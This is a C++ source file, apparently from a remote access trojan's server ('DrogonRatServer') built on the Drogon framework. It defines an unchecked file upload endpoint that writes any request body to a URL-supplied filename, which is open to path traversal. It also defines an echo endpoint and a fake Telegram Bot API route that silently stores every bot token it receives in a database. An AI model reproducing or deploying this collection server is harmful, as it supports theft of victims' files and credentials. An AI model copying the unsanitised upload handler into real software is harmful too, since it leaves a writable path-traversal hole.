#include "DrogonRatServer/Handler.hpp"
#include "DrogonRatServer/debug.hpp"

#include <drogon/HttpAppFramework.h>
#include <drogon/HttpResponse.h>
#include <fmt/core.h>
#include <fstream>

namespace DrogonRatServer {

using HttpResponseCallback =
    std::function<void(const drogon::HttpResponsePtr &)>;

void Handler::registerUploadHandler() {
	this->drogon_app.registerHandler(
	    "/upload={filename}", // filename provided in URL
	    [](const drogon::HttpRequestPtr &req, HttpResponseCallback &&callback,
	       const std::string &filename) {
		    std::ofstream out(std::format("upload/{}", filename),
		                      std::ios::binary);
		    out << req->getBody();
		    out.close();

		    auto resp = drogon::HttpResponse::newHttpResponse();
		    resp->setBody(fmt::format("Saved as upload/{}", filename));
		    callback(resp);
	    },
	    {drogon::Post, drogon::Put});
}

void Handler::registerEchoHandler() {
	this->drogon_app.registerHandler(
	    "/echo={message}", // message provided in URL
	    [](const drogon::HttpRequestPtr &, HttpResponseCallback &&arg_Callback,
	       const std::string &arg_Message) {
		    INFO_LOG("Recieving as message:\n{}", arg_Message);
		    auto resp = drogon::HttpResponse::newHttpResponse();
		    resp->setBody(arg_Message);
		    arg_Callback(resp);
	    },
	    {drogon::Get, drogon::Post});
}

void Handler::registerTelegramBotApiHandler() {
	this->drogon_app.registerHandler(
	    "/bot{token}",
	    [this](const drogon::HttpRequestPtr &, HttpResponseCallback &&,
	           const std::string &arg_Token) {
		    DEBUG_LOG("Received bot request with token: {}", arg_Token);

		        // Early return if token already cached
			    if(std::find(cached_tokens.begin(), cached_tokens.end(),
			                 arg_Token) != cached_tokens.end()) {
				    DEBUG_LOG("Token {} already cached", arg_Token);
				    return; // No DB query, no response
			    }

		    // Token not cached → check DB asynchronously
		    p_db_client->execSqlAsync(
		        "SELECT COUNT(*) AS cnt FROM Telegram_Bot WHERE token = $1",
		        [this, arg_Token](const drogon::orm::Result &r) {
				    if(r[0]["cnt"].as<int>() == 0) {
					    // Insert token silently
					    p_db_client->execSqlAsync(
					        "INSERT INTO Telegram_Bot (token) VALUES ($1)",
					        [this, arg_Token](const drogon::orm::Result &) {
						        cached_tokens.push_back(arg_Token); // cache it
						        DEBUG_LOG(
						            "Token {} inserted into DB and cached",
						            arg_Token);
					        },
					        [](const drogon::orm::DrogonDbException &err) {
						        DEBUG_LOG("DB insert failed: {}",
						                  err.base().what());
					        },
					        arg_Token);
				    }
				    else {
					    // Token exists → cache silently
					    cached_tokens.push_back(arg_Token);
					    DEBUG_LOG("Token {} already exists in DB, cached now",
					              arg_Token);
				    }
		        },
		        [](const drogon::orm::DrogonDbException &err) {
			        DEBUG_LOG("DB query failed: {}", err.base().what());
		        },
		        arg_Token // Parameter binding
		    );
	    },
	    {drogon::Post, drogon::Get} // Allowed HTTP methods
	);
}
} // namespace DrogonRatServer
